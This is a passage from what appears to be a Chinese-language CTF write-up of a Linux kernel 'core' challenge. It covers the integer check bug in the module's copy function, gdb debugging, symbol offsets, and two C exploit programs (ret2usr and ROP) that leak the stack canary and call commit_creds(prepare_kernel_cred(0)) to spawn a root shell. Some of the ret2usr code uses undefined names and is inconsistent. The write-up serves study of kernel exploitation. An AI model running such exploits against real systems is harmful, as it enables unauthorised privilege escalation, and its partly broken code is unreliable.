class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);                           <span class="comment">// detect overflow</span></span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v2, &amp;name, (<span class="type">unsigned</span> __int16)a1);   <span class="comment">// so we copy at most 64?</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>不难发现，这里有一个问题。在检查a1大小合法性时，是将他和63比较，大于则有错，但是我们可以写小于0的。同时，在真正qmemcopy时，只比较了强行转换为unsigned int 16的变量。我们如果写一个0xfffffffffffff100就可以绕过第一个检查(因为这个数字小于0)，同时也使得第二个检查中结果为0xf100，远远大于64，<strong>这样就实现了栈溢出</strong>。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>首先明确攻击思路。如下所示</p><p>​    (1）获取 commit_creds()，prepare_kernel_cred() 的地址：    /tmp/kallsyms 中保存了这些地址，可以直接读取，同时根据偏移固定也能确定 gadgets 的地址。</p><p>（2）通过 ioctl 设置 off，然后通过 core_read() leak 出 canary</p><p>（3）通过 core_write() 向 name 写，构造 ropchain</p><p>（4）通过 core_copy_func() 从 name 向局部变量上写，通过设置合理的长度和 canary 进行 rop</p><p>（5）通过 rop 执行 commit_creds(prepare_kernel_cred(0))</p><p>（6）返回用户态，通过 system(“/bin/sh”) 等起 shell</p><h3 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h3><p>我们如果要调试内核，首先要获取镜像加载地址。在一般的os中，内核通常在高地址。这里我们可以直接看到，如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在启动好的题目中</span></span><br><span class="line">/ <span class="meta"># cat /sys/module/core/sections/.text</span></span><br><span class="line"><span class="number">0xffffffffc03f0000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着，开一个gdb远程连接上去。使用如下命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一步：远程连接</span></span><br><span class="line">pwndbg&gt; target remote <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1234</span> </span><br><span class="line"><span class="comment">// 第二步：加载符号文件的基地址</span></span><br><span class="line">pwndbg&gt; add-symbol-file ./core/core.ko <span class="number">0xffffffffc03f0000</span><span class="comment">// 这个地址就是上面的到的地址</span></span><br></pre></td></tr></table></figure><p>接着就可以在函数名上面下断点了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b core_read</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0xffffffffc03f0063</span></span><br></pre></td></tr></table></figure><p>以上相当于获得了镜像的函数地址，但是我们最终需要执行的是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>这两个函数都在类似于glibc的vmlinux中。为此，我们要首先找到这两个函数的偏移(在pwntools中没有直接找到vmlinux中符号偏移的方法)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./core/vmlinux&#x27;</span>)</span><br><span class="line"><span class="comment"># 0xffffffff81000000 找到的办法:</span></span><br><span class="line">➜  give_to_player git:(main) ✗ checksec ./core/vmlinux </span><br><span class="line"><span class="comment"># [*] &#x27;/home/nicholas/Desktop/kernel/pwnkernel/problems/give_to_player/core/vmlinux&#x27;</span></span><br><span class="line"><span class="comment">#     Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">#     Version:  4.15.8</span></span><br><span class="line"><span class="comment">#     RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">#     Stack:    Canary found</span></span><br><span class="line"><span class="comment">#     NX:       NX disabled</span></span><br><span class="line"><span class="comment">#     PIE:      No PIE (0xffffffff81000000)    &lt;=====地址在这里</span></span><br><span class="line"><span class="comment">#     RWX:      Has RWX segments</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;commit_creds&quot;</span>,<span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;commit_creds&#x27;</span>]-<span class="number">0xffffffff81000000</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;prepare_kernel_cred&quot;</span>,<span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;prepare_kernel_cred&#x27;</span>]-<span class="number">0xffffffff81000000</span>)</span><br><span class="line"><span class="comment"># result:找到的偏移量</span></span><br><span class="line"><span class="comment"># commit_creds 0x9c8e0</span></span><br><span class="line"><span class="comment"># prepare_kernel_cred 0x9cce0</span></span><br></pre></td></tr></table></figure><p>接下来寻找在内核中<code>commit_creds</code>的地址。和用户态一样，VMlinux也会被加载到一个随机地址。但是不重要，一旦我们知道了偏移，就可以知道被加载到内核中的VMlinux的基地址，从而计算出内核中<code>commit_creds</code>的地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> /proc/kallsyms | grep commit_creds</span></span><br><span class="line">ffffffffaa09c8e0 T commit_creds</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">(python3)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; hex(0xffffffffaa09c8e0-0x9c8e0)</span></span><br><span class="line">&#x27;0xffffffffaa000000&#x27;   # 得到加载VMlinux的基地址 </span><br></pre></td></tr></table></figure><h3 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h3><p>首先了解一下流程</p><blockquote><p>1 ***执行 commit_creds(prepare_kernel_cred(0))***，此时该进程已经是id为0的root进程了，但是仍在内核态中。而这条语句的执行可以用ROP来做，由于SMEP没开，ret2user也可以，ret2user就是在编写的程序中写入一个函数调用该函数，将ROP的该部分直接写成用户态函数的地址；</p><p>2 ***执行swapgs***，准备回到用户态</p><p>3 iretq回到用户态，在rsp指向的位置布置好相关寄存器的值，特别的将rip寄存器的值保存为执行system(“/bin/sh”)，再返回用户态后就可以拿到一个root权限的shell了。</p></blockquote><p>由于没有开启<code>smep</code>，可以尝试用ret2usr来做。</p><p>在<code>ret2usr</code>过程中，包括了os里面的保存寄存器，弹出寄存器的操作。这里需要我们手写内联汇编。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 保存用户上下文</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_ss, user_eflags,user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line"><span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line"><span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_eflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">&quot;memory&quot;</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着可以根据反汇编结果编写交互函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setoff</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> off)</span>&#123;</span><br><span class="line">ioctl(fd,<span class="number">0x6677889C</span>,off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd,<span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">ioctl(fd,<span class="number">0x6677889B</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy</span><span class="params">(<span class="type">int</span> fd , <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> len)</span>&#123;</span><br><span class="line">ioctl(fd, <span class="number">0x6677889A</span>,len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来可以编写main函数。这里尝试分析一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_ss, user_eflags,user_sp;</span><br><span class="line"><span class="type">size_t</span> commit_creds_addr,prepare_kernel_cred_addr;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889B</span>,buf);</span><br><span class="line">    <span class="comment">//printf(&quot;[*]The buf is:%x\n&quot;,buf);</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">change_off</span><span class="params">(<span class="type">long</span> <span class="type">long</span> v1)</span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889c</span>,v1);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf,<span class="type">int</span> a3)</span>&#123;</span><br><span class="line">    write(fd,buf,a3);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">long</span> <span class="type">long</span> size)</span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889a</span>,size);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">        :<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_eflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line">        :</span><br><span class="line">        : <span class="string">&quot;memory&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred_addr;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds_addr;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">save_stats() ; <span class="comment">// 保存上下文</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> buf[<span class="number">0x40</span>/<span class="number">8</span>]; <span class="comment">// 创建一个0x40长度的buf，作为用户态和内核交互的缓冲区</span></span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x40</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> canary ;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> module_base ;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> vmlinux_base ; </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> iretq ;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> swapgs ;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rop[<span class="number">0x30</span>];</span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x30</span>*<span class="number">8</span>);<span class="comment">// 不知道这是干什么用的</span></span><br><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);<span class="comment">// 大概是打开内核文件</span></span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;open file error\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;open file success\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] buf: 0x%p&quot;</span>,buf);</span><br><span class="line">setoff(fd,<span class="number">0x40</span>);<span class="comment">// 设置off的值，0x40之后一个就是canary。于是可以泄露。主语buf类型是char</span></span><br><span class="line">core_read(fd,buf);</span><br><span class="line">canary = buf[<span class="number">0</span>];<span class="comment">// 获取canary</span></span><br><span class="line">module_base =  buf[<span class="number">2</span>] - <span class="number">0x19b</span>;  <span class="comment">// 这两个地址是看出来比较接近module和vmlinux的。具体看出来的方法就是调试，看栈</span></span><br><span class="line">vmlinux_base = buf[<span class="number">4</span>] - <span class="number">0x16684f0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] canary: 0x%p&quot;</span>,canary);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] module_base: 0x%p&quot;</span>,module_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] vmlinux_base: 0x%p&quot;</span>,vmlinux_base);</span><br><span class="line">commit_creds = vmlinux_base + <span class="number">0x9c8e0</span>;<span class="comment">// 找到对应两个重要函数</span></span><br><span class="line">prepare_kernel_cred = vmlinux_base + <span class="number">0x9cce0</span>;</span><br><span class="line">iretq = vmlinux_base + <span class="number">0x50ac2</span>;<span class="comment">// 这个是找到的gadget，偏移量计算方式和之前差不多</span></span><br><span class="line">swapgs  = module_base + <span class="number">0x0d6</span>;</span><br><span class="line">rop[<span class="number">8</span>] = canary ; </span><br><span class="line">   rop[<span class="number">9</span>] = <span class="number">0</span>;  <span class="comment">// rbp,随便写即可</span></span><br><span class="line">rop[<span class="number">10</span>] = payload;<span class="comment">// &lt;=== ret</span></span><br><span class="line">rop[<span class="number">11</span>] = swapgs;<span class="comment">// swapgs; popfq; ret     swapgs表示切换页表，接下来按照push顺序pop各个寄存器的值：</span></span><br><span class="line">rop[<span class="number">12</span>] = <span class="number">0</span>; <span class="comment">// </span></span><br><span class="line">rop[<span class="number">13</span>] = iretq ;</span><br><span class="line">rop[<span class="number">14</span>] = get_shell ; <span class="comment">// RIP 也就是我们的system函数，可以直接写用户态的地址</span></span><br><span class="line">rop[<span class="number">15</span>] = user_cs;<span class="comment">// 这些值我没看见在哪里定义过？但是也不能直接设置为0，可能是内联汇编保存的</span></span><br><span class="line">rop[<span class="number">16</span>] = user_eflags;</span><br><span class="line">rop[<span class="number">17</span>] = user_sp;</span><br><span class="line">rop[<span class="number">18</span>] = user_ss;</span><br><span class="line">rop[<span class="number">19</span>] = <span class="number">0</span>;<span class="comment">// 不知道这个的用处</span></span><br><span class="line">write(fd,rop,<span class="number">0x30</span>*<span class="number">8</span>);</span><br><span class="line">core_copy(fd,<span class="number">0xf000000000000000</span>+<span class="number">0x30</span>*<span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>静态编译上述文件，并放到文件系统中，之后可以尝试调试。</p><p>刚才没有说明如何找到canary，这里通过调试说明</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">(pwndbg)</span></span><br><span class="line">   0xffffffffc012006e &lt;core_read+11&gt;    sub    rsp, init_module+36           &lt;72&gt;</span><br><span class="line">   0xffffffffc0120072 &lt;core_read+15&gt;    mov    rax, qword ptr gs:[0x28]</span><br><span class="line">   0xffffffffc012007b &lt;core_read+24&gt;    mov    qword ptr [rsp + 0x40], rax</span><br><span class="line"> ► 0xffffffffc0120080 &lt;core_read+29&gt;    xor    eax, eax</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以看到上面把canary放到rsp+0x40地方。其实IDA里面也能看到。我们想调试的主要目的是想获得module和vmlinux的一些地址。</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">(pwndbg)</span></span><br><span class="line">08:0040│     0xffffa6f6400d3e58 ◂— add    ch, al /* 0xabcb5d9dd231c500 */ # canary</span><br><span class="line">09:0048│     0xffffa6f6400d3e60 —▸ 0x7fff7548c1a0 ◂— 0</span><br><span class="line">0a:0050│     0xffffa6f6400d3e68 —▸ 0xffffffffc012019b (core_ioctl+60) ◂— jmp    0xffffffffc01201b5  # about module base</span><br><span class="line">0b:0058│     0xffffa6f6400d3e70 —▸ 0xffff8a54c78b66c0 ◂— add    qword ptr [r8], rax /* 0x81b6f000014b */</span><br><span class="line">0c:0060│     0xffffa6f6400d3e78 —▸ 0xffffffffba7dd6d1 ◂— mov    rdi, rbx # about vmlinux base</span><br><span class="line">0d:0068│     0xffffa6f6400d3e80 ◂— wait    /* 0x889b */</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里vmlinux base和module base两个的关系还是没有很清楚。</p><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>rop就是如果无法在用户空间直接执行commit_creds(prepare_kernel_cred(0))时采用的方法。在上面ret2usr中我们实际上是在用户地址空间中执行的上述exp，但是如果有限制不能再用户空间执行此函数。我们首先要在vmlinux中找到此函数的地址，具体方法就是先泄露偏移量，再通过之前讲到的获取符号表的方法找到commit_creds和prepare_kernel_cred这两个函数的偏移，使用rop调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_ss, user_eflags,user_sp;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span> *buf)</span>&#123;</span><br><span class="line"> ioctl(fd,<span class="number">0x6677889B</span>,buf);</span><br><span class="line"> <span class="comment">//printf(&quot;[*]The buf is:%x\n&quot;,buf);</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">change_off</span><span class="params">(<span class="type">long</span> <span class="type">long</span> v1)</span>&#123;</span><br><span class="line"> ioctl(fd,<span class="number">0x6677889c</span>,v1);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf,<span class="type">int</span> a3)</span>&#123;</span><br><span class="line"> write(fd,buf,a3);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">long</span> <span class="type">long</span> size)</span>&#123;</span><br><span class="line"> ioctl(fd,<span class="number">0x6677889a</span>,size);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>&#123;</span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span>&#123;</span><br><span class="line"> <span class="keyword">asm</span>(</span><br><span class="line">     <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">     <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">     <span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line">     <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">     <span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">     :<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_eflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line">      :</span><br><span class="line">      : <span class="string">&quot;memory&quot;</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"> <span class="type">int</span> ret,i;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line"> <span class="type">size_t</span> vmlinux_base,core_base,canary;</span><br><span class="line"> <span class="type">size_t</span> commit_creds_addr,prepare_kernel_cred_addr;</span><br><span class="line"> <span class="type">size_t</span> commit_creds_offset = <span class="number">0x9c8e0</span>;</span><br><span class="line"> <span class="type">size_t</span> prepare_kernel_cred_offset = <span class="number">0x9cce0</span>;</span><br><span class="line"> <span class="type">size_t</span> rop[<span class="number">0x100</span>];</span><br><span class="line"> save_stats();</span><br><span class="line"> fd = open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line"> change_off(<span class="number">0x40</span>);</span><br><span class="line"> core_read(buf);</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> for(i=0;i&lt;0x40;i++)&#123;</span></span><br><span class="line"><span class="comment"> printf(&quot;[*] The buf[%x] is:%p\n&quot;,i,*(size_t *)(&amp;buf[i]));</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> vmlinux_base = *(<span class="type">size_t</span> *)(&amp;buf[<span class="number">0x20</span>]) - <span class="number">0x1dd6d1</span>;</span><br><span class="line"> core_base = *(<span class="type">size_t</span> *)(&amp;buf[<span class="number">0x10</span>]) - <span class="number">0x19b</span>;</span><br><span class="line"> prepare_kernel_cred_addr = vmlinux_base + prepare_kernel_cred_offset;</span><br><span class="line"> commit_creds_addr = vmlinux_base + commit_creds_offset;</span><br><span class="line"> canary = *(<span class="type">size_t</span> *)(&amp;buf[<span class="number">0</span>]);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;[*]canary:%p\n&quot;</span>,canary);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;[*]vmlinux_base:%p\n&quot;</span>,vmlinux_base);</span><br><span class="line"> <span class="built_in">printf</span>(<span 